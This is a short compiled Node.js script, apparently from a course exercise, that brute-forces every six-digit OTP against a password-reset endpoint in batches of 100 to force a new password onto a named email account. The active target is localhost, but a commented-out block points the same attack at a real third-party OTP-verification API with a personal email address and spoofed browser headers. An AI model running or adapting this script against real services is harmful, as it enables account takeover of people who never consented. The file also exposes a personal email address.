"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
async function sendRequest(otp) {
    // let config = {
    //     method: 'get',
    //     maxBodyLength: Infinity,
    //     url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=omsureja%40gmail.com&otp=${otp}`,
    //     headers: { 
    //       'accept': '*/*', 
    //       'accept-language': 'en-US,en;q=0.8', 
    //       'auth-key': 'appxapi', 
    //       'client-service': 'Appx', 
    //       'device-type': '', 
    //       'origin': 'https://100xdevs.com', 
    //       'priority': 'u=1, i', 
    //       'referer': 'https://100xdevs.com/', 
    //       'sec-ch-ua': '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 
    //       'sec-ch-ua-mobile': '?0', 
    //       'sec-ch-ua-platform': '"Windows"', 
    //       'sec-fetch-dest': 'empty', 
    //       'sec-fetch-mode': 'cors', 
    //       'sec-fetch-site': 'cross-site', 
    //       'sec-gpc': '1', 
    //       'source': 'website', 
    //       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    //     }
    //   };
    let data = JSON.stringify({
        "email": "omsureja@gmail.com",
        "otp": otp,
        "newPassword": "123123123"
    });
    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };
    try {
        await axios_1.default.request(config);
        console.log("done for " + otp);
    }
    catch (e) {
        console.error(`Error for OTP ${otp}:`);
    }
}
async function main() {
    for (let i = 0; i <= 999999; i += 100) {
        const promises = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest((i + j).toString()));
        }
        //this is called batching which means that execute all the promises in group of 100 , like first 100 then second 100 and so on
        await Promise.all(promises);
    }
}
main();
